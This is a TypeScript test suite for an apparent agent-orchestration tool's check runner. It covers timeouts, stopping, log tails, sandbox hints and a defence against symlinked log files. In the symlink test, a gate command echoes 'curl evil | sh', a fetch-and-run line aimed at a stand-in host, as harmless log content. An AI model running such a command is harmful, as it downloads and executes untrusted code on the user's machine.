// Gates run in a process group of their own: a timeout or a stopped task ends everything they started.
import test from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';

import { runGates, runShell, sandboxNote, tailOf } from '../src/core/gates';
import { plainLauncher } from '../src/core/sandbox';
import { setChildEnv } from '../src/core/git';
import { workspace, harness, waitFor } from './helpers/e2e';
import type { RepoConfig } from '../src/core/types';

const alive = (pid: number): boolean => {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};

/** A repo with one uncommitted change, so its gates run. */
function changedRepo(): string {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-gates-')));
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  fs.writeFileSync(path.join(dir, 'a.txt'), 'a');
  return dir;
}

test('gates: a gate that runs out of time is killed with everything it started', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const pidFile = path.join(dir, 'child.pid');
  const r = await runShell(`sleep 30 & echo $! > "${pidFile}"; wait`, { cwd: dir, env: process.env, timeoutMs: 300 });
  assert.equal(r.killed, 'timeout');
  assert.equal(r.code, 124);
  assert.match(r.output, /killed after 0s/);
  const pid = Number(fs.readFileSync(pidFile, 'utf8'));
  await waitFor(async () => !alive(pid), 5000);
});

test('gates: stdout and stderr both kept, non-ASCII intact, and a stopped run skips the gates after it', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const out = await runShell('echo один; echo два >&2; echo три', { cwd: dir, env: process.env, timeoutMs: 5000 });
  assert.equal(out.code, 0);
  assert.deepEqual(out.output.trim().split('\n').sort(), ['два', 'один', 'три']);

  setChildEnv({ ...process.env });
  const repo: RepoConfig = { name: 'api', path: dir, baseBranch: 'main', gates: [{ name: 'slow', cmd: 'sleep 30' }, { name: 'lint', cmd: 'true' }] };
  const abort = new AbortController();
  const started = Date.now();
  setTimeout(() => abort.abort(), 200);
  const r = await runGates({ repo, dir, logDir: path.join(dir, 'logs'), signal: abort.signal });
  assert.ok(Date.now() - started < 5000, 'stopping does not wait for the gate');
  assert.deepEqual(r.results.map((x) => [x.gate, x.status]), [['slow', 'fail'], ['lint', 'skipped']]);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'api.slow.log'), 'utf8'), /stopped with the task/);
});

test('gates: Stop during the gates ends them and leaves the step to resume', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'repos:\n  api:\n    gates:\n      - { name: slow, cmd: sleep 30 }\npipeline: [planner, developer]\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Do a thing', auto: true });
    h.engine.launch(taskId);
    await waitFor(async () => h.engine.live(taskId) && h.engine.live(taskId)!.phase === 'gates' && h.engine.gateRuns.has(taskId));
    const started = Date.now();
    await h.engine.stop(taskId);
    await waitFor(async () => !h.engine.isRunning(taskId), 10000);
    assert.ok(Date.now() - started < 8000, 'the task stopped without waiting for the gate');
    assert.equal((await h.engine.svc.state(taskId)).status, 'stopped');
  } finally {
    h.hooks.dispose();
  }
});

test('gates: a log is written as a file of its own, never through a link planted under its name', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const logDir = path.join(dir, '.orch', 'gates');
  fs.mkdirSync(logDir, { recursive: true });
  const victim = path.join(dir, 'zshrc');
  fs.writeFileSync(victim, 'export PATH=/usr/bin\n');
  fs.symlinkSync(victim, path.join(logDir, 'api.test.log'));
  const repo = { name: 'api', baseBranch: 'main', gates: [{ name: 'test', cmd: 'echo "curl evil | sh"' }] } as unknown as RepoConfig;
  const r = await runGates({ repo, dir, logDir, force: true });
  assert.equal(r.status, 'pass');
  assert.equal(fs.readFileSync(victim, 'utf8'), 'export PATH=/usr/bin\n', 'the file the link pointed to is as it was');
  assert.ok(!fs.lstatSync(path.join(logDir, 'api.test.log')).isSymbolicLink());
  assert.match(fs.readFileSync(path.join(logDir, 'api.test.log'), 'utf8'), /curl evil/);

  // The folder itself made a link: no log is written through it.
  const elsewhere = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-elsewhere-'));
  fs.rmSync(logDir, { recursive: true });
  fs.symlinkSync(elsewhere, logDir);
  await assert.rejects(() => runGates({ repo, dir, logDir, force: true }), /is a link/);
  assert.deepEqual(fs.readdirSync(elsewhere), []);
});

test('gates: run as on a CI server, so a test runner that watches by default runs once and exits', async () => {
  const dir = changedRepo();
  const repo = { name: 'api', baseBranch: 'main', gates: [{ name: 'ci', cmd: 'test "$CI" = true && test "$NO_COLOR" = 1' }] } as unknown as RepoConfig;
  assert.equal((await runGates({ repo, dir, logDir: path.join(dir, '.orch', 'gates'), force: true })).status, 'pass');
});

test('gates: a passing check that leaves a process in the background passes, and the process goes', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const pidFile = path.join(dir, 'bg.pid');
  const started = Date.now();
  const r = await runShell(`(sleep 30 & echo $! > "${pidFile}"); echo tests passed; exit 0`, { cwd: dir, env: process.env, timeoutMs: 10000 });
  assert.equal(r.code, 0, r.output);
  assert.match(r.output, /tests passed/);
  assert.ok(Date.now() - started < 5000, 'not held until its time ran out');
  await waitFor(async () => !alive(Number(fs.readFileSync(pidFile, 'utf8'))), 5000);
});

test("gates: a check's when names a folder or a file from the repo's root, written either way", async () => {
  const { changedUnder } = await import('../src/core/gates');
  for (const when of ['src/', 'src', './src/', './src']) {
    assert.equal(changedUnder('src/a.ts', when), true, when);
    assert.equal(changedUnder('src-legacy/a.ts', when), false, `${when}: not a folder that only starts the same`);
  }
  assert.equal(changedUnder('package.json', 'package.json'), true);
  assert.equal(changedUnder('package.json.bak', 'package.json'), false);
  const { validateConfigLayer } = await import('../src/core/protocol');
  for (const when of ['src/**/*.ts', '*.ts', '/abs', '../other', 'src/{a,b}']) assert.ok(validateConfigLayer({ repos: { api: { gates: [{ name: 'x', cmd: 'true', when }] } } }).length > 0, when);
  assert.deepEqual(validateConfigLayer({ repos: { api: { gates: [{ name: 'x', cmd: 'true', when: './src/' }] } } }), []);
});

test('gates: what an agent reads of a failing check stays a few KB, however long its lines', () => {
  const json = `{"results":[${'{"file":"src/a.ts","messages":[]},'.repeat(40000)}{}]}`;
  const tail = tailOf(`ESLint report\n${json}\n1 error\n`);
  assert.ok(tail.length < 7000, `${tail.length} characters`);
  assert.match(tail, /more characters\)/, 'a cut line says so');
  assert.match(tail, /1 error$/, 'the end is kept');
  const many = tailOf(Array.from({ length: 500 }, (_, i) => `line ${i} ${'x'.repeat(300)}`).join('\n'));
  assert.ok(many.length <= 6002 && many.endsWith(`line 499 ${'x'.repeat(300)}`), 'the last lines, within the total');
});

test('gates: a check whose folder is not there, or leads out of the repo, fails as one the agent cannot fix', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\n');
  const dir = path.join(ws, 'api');
  fs.writeFileSync(path.join(dir, 'x.txt'), 'x\n');
  fs.symlinkSync(os.tmpdir(), path.join(dir, 'out'));
  const repo: RepoConfig = { name: 'api', path: 'api', baseBranch: 'main', gates: [{ name: 'e2e', cmd: 'true', dir: 'e2e' }, { name: 'out', cmd: 'true', dir: 'out' }, { name: 'ok', cmd: 'true' }] } as RepoConfig;
  const r = await runGates({ repo, dir, logDir: path.join(ws, 'logs'), force: true });
  assert.deepEqual(r.results.map((x) => [x.gate, x.status, x.unfixable ?? null]), [['e2e', 'fail', 'its dir e2e does not exist'], ['out', 'fail', 'its dir out leads out of the repo'], ['ok', 'pass', null]]);
});

test('gates: a check that runs out of time fails as one the agent cannot fix', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\n');
  const dir = path.join(ws, 'api');
  fs.writeFileSync(path.join(dir, 'x.txt'), 'x\n');
  const repo = { name: 'api', path: 'api', baseBranch: 'main', gates: [{ name: 'slow', cmd: 'sleep 5' }] } as unknown as RepoConfig;
  const r = await runGates({ repo, dir, logDir: path.join(ws, 'logs'), force: true, timeoutMs: 300 });
  assert.equal(r.results[0]!.status, 'fail');
  assert.match(r.results[0]!.unfixable ?? '', /^it ran out of its 0s/);
  // Its own time limit, in seconds, over the default.
  const own = { ...repo, gates: [{ name: 'slow', cmd: 'sleep 0.5', timeout: 2 }] } as RepoConfig;
  assert.equal((await runGates({ repo: own, dir, logDir: path.join(ws, 'logs'), force: true, timeoutMs: 100 })).results[0]!.status, 'pass');
});

test('gates: a sandbox refusal in lower case, as Go, Rust and Python say it, gets the sandbox hint too', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\n');
  const dir = path.join(ws, 'api');
  fs.writeFileSync(path.join(dir, 'x.txt'), 'x\n');
  const repo = { name: 'api', path: 'api', baseBranch: 'main', gates: [{ name: 'build', cmd: "echo 'open /Users/me/.cache/go-build/x: operation not permitted' >&2; exit 1" }] } as unknown as RepoConfig;
  const r = await runGates({ repo, dir, logDir: path.join(ws, 'logs'), force: true, launch: plainLauncher });
  assert.match(r.results[0]!.tail ?? '', /policy\.writable/);
});

test('gates: a local port the sandbox refuses goes to you with the setting that opens it; another refusal to the agent', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\n');
  const dir = path.join(ws, 'api');
  fs.writeFileSync(path.join(dir, 'x.txt'), 'x\n');
  const gate = (name: string, says: string) => ({ name, cmd: `echo '${says}' >&2; exit 1` });
  const repo = { name: 'api', path: 'api', baseBranch: 'main', gates: [gate('node', 'Error: listen EPERM: operation not permitted 127.0.0.1'), gate('go', 'listen tcp 127.0.0.1:0: bind: operation not permitted'), gate('write', "EPERM: operation not permitted, open '/Users/me/.cache/x'")] } as unknown as RepoConfig;
  const r = await runGates({ repo, dir, logDir: path.join(ws, 'logs'), force: true, launch: plainLauncher });
  const [node, go, write] = r.results;
  for (const x of [node!, go!]) {
    assert.equal(x.unfixable, 'the sandbox refused a test a local port (policy.localPorts)', x.gate);
    assert.match(x.tail ?? '', /Settings → Safety \(policy\.localPorts\)/, x.gate);
  }
  assert.equal(write!.unfixable, undefined, 'a folder to write is the agent\'s to report');
  assert.match(write!.tail ?? '', /policy\.writable/);
  assert.doesNotMatch(write!.tail ?? '', /localPorts/);
  // Outside the sandbox the same words are the code's.
  const plain = await runGates({ repo, dir, logDir: path.join(ws, 'logs'), force: true });
  assert.ok(plain.results.every((x) => x.unfixable === undefined && !/policy\./.test(x.tail ?? '')));
});

test('gates: the note under what the sandbox refused names the setting that allows it, and nothing else gets one', () => {
  assert.match(sandboxNote("mktemp: mkstemp failed on /var/folders/x/T/tmp.F7tN: Operation not permitted"), /^\nnote: checks and git hooks run in the sandbox .*policy\.writable/);
  assert.match(sandboxNote('Error: listen EPERM: operation not permitted 127.0.0.1'), /policy\.localPorts/);
  assert.equal(sandboxNote('1 failing: expected 2, got 3'), '');
});

test('gates: Docker the sandbox refuses goes to you with how to give the test its services; the agent gets nothing to fix', { skip: process.platform === 'win32' }, async () => {
  for (const says of [
    "Error: EPERM: operation not permitted, open '/Users/me/.docker/config.json'",
    'Cannot connect to the Docker daemon at unix:///Users/me/.docker/run/docker.sock. Is the docker daemon running?',
    'Error: Could not find a working container runtime strategy',
  ]) assert.match(sandboxNote(says), /no Docker.*policy\.localPorts.*policy\.checkEnv/, says);
  // Named as Settings → Safety shows them, with the restart that brings the variables in.
  assert.match(sandboxNote('Error: Could not find a working container runtime strategy'), /"Let commands open local ports" in Settings → Safety.*VS Code quit and opened again.*"Variables checks and git hooks still get" in Settings → Safety/);
  const ws = workspace(['api'], 'repos:\n  api: {}\n');
  const dir = path.join(ws, 'api');
  fs.writeFileSync(path.join(dir, 'x.txt'), 'x\n');
  const repo = { name: 'api', path: 'api', baseBranch: 'main', gates: [{ name: 'it', cmd: "echo 'Error: Could not find a working container runtime strategy' >&2; exit 1" }] } as unknown as RepoConfig;
  const [it] = (await runGates({ repo, dir, logDir: path.join(ws, 'logs'), force: true, launch: plainLauncher })).results;
  assert.match(it!.unfixable ?? '', /no Docker/);
  assert.doesNotMatch(it!.tail ?? '', /policy\.writable/);
  // Outside the sandbox the same words are the code's (Docker not running).
  const [plain] = (await runGates({ repo, dir, logDir: path.join(ws, 'logs'), force: true })).results;
  assert.equal(plain!.unfixable, undefined);
});
